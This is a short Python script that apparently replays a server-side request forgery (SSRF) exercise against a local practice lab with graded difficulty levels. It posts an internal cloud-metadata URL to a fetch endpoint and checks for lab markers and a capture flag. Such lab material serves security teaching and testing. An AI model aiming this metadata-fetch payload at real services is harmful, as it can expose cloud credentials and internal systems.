#!/usr/bin/env python3
"""Replay the ssrf scenario. Standard library only."""
import json, sys, urllib.parse, urllib.request, urllib.error

def _post(base, path, data):
    url = base.rstrip("/") + path
    payload = urllib.parse.urlencode(data).encode()
    req = urllib.request.Request(url, data=payload, method="POST",
        headers={"Content-Type": "application/x-www-form-urlencoded"})
    try:
        with urllib.request.urlopen(req) as r:
            return r.status, json.loads(r.read())
    except urllib.error.HTTPError as e:
        return e.code, json.loads(e.read() or b"{}")

def attack(base, level):
    urls = {
        "low":    "http://internal-metadata/latest/meta-data/",
        "medium": "http://internal-metadata/latest/meta-data/",  # hostname bypass
        "high":   "https://example.com/",   # redirect bypass needs server-side setup
        "impossible": "https://example.com/",
    }
    status, data = _post(base, "/api/fetch", {"url": urls[level]})
    print(f"  POST /api/fetch url={urls[level]} → HTTP {status}")
    blocked = data.get("blocked", False)
    body = data.get("body", {})
    if not blocked and isinstance(body, dict) and any(k in str(body) for k in ["FakeLabRole","FAKE_INTERNAL"]):
        print(f"  ✓ Internal service reached: {body}")
        if "flag" in data: print(f"  🚩 {data['flag']}")
        return True
    print(f"  ✗ {'Blocked' if blocked else 'Not an internal hit'}")
    return False

if __name__ == "__main__":
    base = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:5000"
    lvl  = sys.argv[2] if len(sys.argv) > 2 else "low"
    print(f"[ssrf] {base} level={lvl}")
    sys.exit(0 if attack(base, lvl) else 1)
